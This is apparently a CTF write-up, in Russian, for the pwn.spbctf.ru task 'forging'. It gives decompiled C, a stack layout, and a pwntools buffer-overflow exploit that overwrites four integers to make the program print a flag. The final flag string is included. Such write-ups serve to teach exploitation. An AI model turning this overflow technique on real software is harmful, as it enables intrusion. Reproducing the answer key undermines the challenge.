[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn1_forging)
Описание: Hi! This is your [binary](https://pwn.spbctf.ru/files/overflow/forging)  
nc 109.233.56.90 11578

Тут надо просто переполнить буфер и переписать intы.
``` C
v12 = __readfsqword(0x28u);
setvbuf(stdin, nullptr, 2, 0);
setvbuf(stdout, nullptr, 2, 0);
a = -1;
b = -1;
c = -1;
d = -1;
do
{
  puts("Hello! Enter your name:");
  read_n(name, 49);
  printf("this is your name: %s\nIs this correct? [y/N]", name);
  read_n(correct, 2);
}
while ( (correct[0] | 0x20) != 'y' );

if ( a == 13303482 && b == 12508845 && c == 12513041 && d == 16720401 )
{
  stream = fopen("flag.txt", "r");
  memset(s, 0, 0x100u);
  fread(s, 0x100u, 1, stream);
  fclose(stream);
  puts(s);
}
return 1;
```

``` stack
-0000000000000150         char name[32];
-0000000000000130         int a;
-000000000000012C         int b;
-0000000000000128         int c;
-0000000000000124         int d;
```

Эксплоит:
``` python
io = start()

io.recvuntil(b'name:')
payload = b'A' * 32 + p32(13303482) + p32(12508845) + p32(12513041) + p32(16720401)
io.sendline(payload)
io.recvuntil(b'[y/N]')
io.sendline(b'y')

io.interactive()
```

Проверка:
![{717198F0-50A7-439A-A884-CB4AF80B17F5}](../../../../z.%20Images/{717198F0-50A7-439A-A884-CB4AF80B17F5}.png)

Ответ: `spbctf{forging_zeroes_via_c_string_is_not_so_hard}`
